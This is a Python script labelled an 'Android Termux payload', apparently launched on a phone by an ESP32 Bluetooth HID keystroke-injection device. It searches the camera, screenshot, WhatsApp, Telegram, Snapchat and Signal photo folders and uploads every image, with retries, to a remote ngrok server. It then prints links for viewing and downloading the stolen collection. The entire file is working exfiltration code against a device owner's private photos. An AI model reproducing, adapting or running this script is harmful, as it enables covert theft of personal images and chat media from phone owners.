#!/usr/bin/env python3
"""
fetch_photos.py — Android Termux payload
Scans ALL photo directories on /sdcard and uploads every photo to the
macOS server via HTTP POST.

Usage (called by ESP32 BLE HID sketch):
    python3 /tmp/fetch_photos.py https://YOUR-NGROK-URL.ngrok-free.app

Termux requirements (run once before using):
    pkg install python curl
    termux-setup-storage   # tap Allow when prompted
"""

import os
import sys
import time
import urllib.request
import urllib.parse

# ── Config ────────────────────────────────────────────────────────────────────

SERVER_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8019"
UPLOAD_URL = f"{SERVER_URL}/upload"

# All directories on /sdcard that may contain photos on Android 17.
# Ordered by most common first.
SEARCH_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Pictures/Screenshots",
    "/sdcard/Pictures/Instagram",
    "/sdcard/Pictures/WhatsApp",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    "/sdcard/Telegram",
    "/sdcard/Download",
    "/sdcard/Movies",
    "/sdcard/Snapchat",
    "/sdcard/Signal/Signal/Signal Images",
]

PHOTO_EXTS  = {".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif", ".bmp"}
RETRY_COUNT = 3       # retries per file on network error
RETRY_DELAY = 2       # seconds between retries
INTER_FILE  = 0.3     # seconds between successful uploads (avoid flooding)
MAX_SIZE_MB = 50      # skip files larger than this (avoids very large videos)

# ── Helpers ───────────────────────────────────────────────────────────────────

def collect_photos():
    """Walk all SEARCH_DIRS and return a deduplicated list of photo paths."""
    seen  = set()
    found = []
    for base in SEARCH_DIRS:
        if not os.path.isdir(base):
            continue
        for root, _, files in os.walk(base):
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in PHOTO_EXTS:
                    continue
                full = os.path.realpath(os.path.join(root, fname))
                if full in seen:
                    continue
                seen.add(full)
                found.append(full)
    return sorted(found)


def upload_file(path):
    """
    Upload a single file via multipart/form-data POST.
    Returns True on success, False on failure.
    Uses only stdlib — no requests dependency needed.
    """
    fname    = os.path.basename(path)
    boundary = "----ESP32BLEHIDBoundary"
    with open(path, "rb") as fh:
        file_data = fh.read()

    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()

    req = urllib.request.Request(
        UPLOAD_URL,
        data=body,
        method="POST",
        headers={
            "Content-Type":               f"multipart/form-data; boundary={boundary}",
            "Content-Length":             str(len(body)),
            "ngrok-skip-browser-warning": "true",
        },
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        resp.read()   # consume body
    return True


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print(f"[fetch_photos] Server: {SERVER_URL}")
    print(f"[fetch_photos] Scanning photo directories ...")

    photos = collect_photos()
    total  = len(photos)

    if total == 0:
        print("[fetch_photos] No photos found. Run termux-setup-storage first.")
        return

    total_mb = sum(os.path.getsize(p) for p in photos) / 1_048_576
    print(f"[fetch_photos] Found {total} photos  ({total_mb:.1f} MB total)")
    print(f"[fetch_photos] Uploading to {UPLOAD_URL} ...\n")

    ok_count   = 0
    skip_count = 0
    fail_count = 0

    for idx, path in enumerate(photos, 1):
        fname   = os.path.basename(path)
        size_mb = os.path.getsize(path) / 1_048_576

        # Skip oversized files (usually videos saved with wrong extension)
        if size_mb > MAX_SIZE_MB:
            print(f"  [{idx}/{total}] SKIP  {fname}  ({size_mb:.1f} MB > {MAX_SIZE_MB} MB limit)")
            skip_count += 1
            continue

        success = False
        for attempt in range(1, RETRY_COUNT + 1):
            try:
                upload_file(path)
                success = True
                break
            except Exception as exc:
                if attempt < RETRY_COUNT:
                    print(f"  [{idx}/{total}] retry {attempt}/{RETRY_COUNT}  {fname}  ({exc})")
                    time.sleep(RETRY_DELAY)
                else:
                    print(f"  [{idx}/{total}] FAIL  {fname}  ({exc})")

        if success:
            print(f"  [{idx}/{total}] OK    {fname}  ({size_mb:.1f} MB)")
            ok_count += 1
            time.sleep(INTER_FILE)
        else:
            fail_count += 1

    print(f"\n[fetch_photos] Done.")
    print(f"  Uploaded : {ok_count}")
    print(f"  Skipped  : {skip_count}  (> {MAX_SIZE_MB} MB)")
    print(f"  Failed   : {fail_count}")
    print(f"\n  View gallery: {SERVER_URL}/photos")
    print(f"  Download ZIP: {SERVER_URL}/photos/zip")


if __name__ == "__main__":
    main()
